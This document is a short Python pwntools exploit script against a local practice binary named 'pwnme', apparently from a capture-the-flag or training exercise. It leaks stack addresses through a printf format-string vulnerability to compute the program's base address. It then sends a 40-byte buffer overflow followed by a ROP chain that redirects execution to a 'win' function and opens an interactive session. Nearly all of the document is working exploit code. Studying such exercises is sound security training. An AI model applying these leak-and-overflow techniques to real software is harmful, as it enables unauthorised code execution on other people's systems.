#!/usr/bin/python3

from pwn import *

'''
1. We need to determine the base address with gdb
2. We need to leak addresses with a format string vulnerability in printf (see leak_address.py)
3. Examine the addresses and determine what addresses we leaked using the same technique we used in previous example
4. We learned this is the addess of init + 55
To get the address of base we need to take init function's offset and 55 from the leaked address.
'''

e = ELF('./pwnme')

init_offset = e.symbols['init']
win_offset = e.symbols['win']

rop = ROP(e)

ret_offset = 0x101a
pop_offset = 0x1353

p = process('./pwnme')
get_leak_payload = b'%p' * 12
p.sendlineafter(b'How about creating a leak?', get_leak_payload)
print(f'Sent {get_leak_payload}, waiting on leak')
leak = p.recv(129).decode().replace('(nil)', '0x1')
leaked = leak.split('0x')
init_55 = int(leaked[9],16)
base_address = init_55 - 55 - init_offset
print(f'Leak: {leak}')
print(f'Leaked init+55 (9th address): {hex(init_55)}')
print(f'Base address {hex(base_address)}')

offset = 40

payload = offset * b'A'
payload += p64(base_address + ret_offset)
payload += p64(base_address + pop_offset)
payload += p64(0xdeadbeef)
payload += p64(base_address + win_offset)

p.sendline(payload)
p.interactive()
